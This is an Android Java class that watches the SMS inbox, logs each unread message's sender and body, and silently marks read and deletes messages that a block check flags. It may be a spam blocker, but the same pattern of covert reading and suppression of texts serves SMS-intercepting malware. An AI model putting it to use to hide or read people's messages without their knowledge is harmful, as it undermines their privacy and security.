package com.rot.sms;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import com.rot.listener.BlockListener;
import com.rot.utils.MyLogger;

public class SmsObserver extends ContentObserver {
    private static String ADDRESS2 = "address";
    public static String URI_SMS_INBOX = "content://sms/inbox";
    private static String BODY = "body";
    private static String URI_CONTENT = "content://sms/conversations/";
    private Context context;
    public SmsObserver(Context context, Handler handler) {
        super(handler);
        this.context = context;
    }
    private void deletSms(Context context, Cursor cursor) {
        ContentValues contentvalues = new ContentValues();
        contentvalues.put("read", "1");
        ContentResolver contentresolver = context.getContentResolver();
        contentresolver.update(Uri.parse(URI_SMS_INBOX), contentvalues, " _id=?", new String[] { String.valueOf(cursor.getInt(0)) });
        String threadId = cursor.getString(cursor.getColumnIndexOrThrow("thread_id"));
        String id = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
        Uri uri1 = Uri.parse(new StringBuilder(URI_CONTENT).append(threadId).toString());
        context.getContentResolver().delete(uri1, "_id=?", new String[] { id });
        cursor.moveToNext();
    }
    @Override
    public void onChange(boolean flag) {
        super.onChange(flag);
        try {
            onSmsContentChanged();
        } catch (Exception e) {
            MyLogger.error(e);
        }
    }
    public void onSmsContentChanged() {
        final Cursor cursor = context.getContentResolver().query(Uri.parse(URI_SMS_INBOX), null, "read=?", new String[] { "0" }, "date desc");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String text = cursor.getString(cursor.getColumnIndexOrThrow(BODY));
                String address = cursor.getString(cursor.getColumnIndexOrThrow(ADDRESS2));
                MyLogger.debug(address, text);
                BlockListener listener = new BlockListener() {
                    private boolean blocked = false;
                    @Override
                    public void stopBroadcast() {
                        if (!blocked) {
                            deletSms(context, cursor);
                            blocked = true;
                        }
                    }
                };
                SmsHelper.checkBlock(context, address, text, listener);
            }
            cursor.close();
        }
    }
}
